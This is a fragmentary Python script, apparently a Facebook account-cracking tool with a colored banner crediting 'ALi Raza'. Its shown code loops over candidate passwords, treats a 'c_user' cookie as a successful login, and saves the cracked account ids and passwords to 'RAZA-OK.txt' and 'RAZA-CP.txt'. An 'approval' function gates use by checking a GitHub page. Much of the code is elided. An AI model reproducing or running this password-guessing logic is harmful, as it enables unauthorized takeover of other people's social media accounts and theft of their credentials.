...
logo = """
 ...
 \033[1;32m  )\ _ )\(_))((_)  )\ _ )(()\((_)\  )(_)))\  
  \033[1;31m (_)_\(_) |  (_)  (_)_\(_|(_) |(_)((_)_((_) 
  \033[1;30m  / _ \ | |__| |   / _ \| '_| '_ \/ _` |_ / 
  \033[1;36m /_/ \_\|____|_|  /_/ \_\_| |_.__/\__,_/__| 
                                            

--------------------------------------------------
[•] AUTHOR     : \033[1;32mALi Raza\033[1;37m
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://www.facebook.com/profile.php?id=100053956534237')
	elif gh =='0':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('RAZA-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
                ...
                open('RAZA-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/Awanmalik0011/Ali.git').text
    if id in httpCaht:
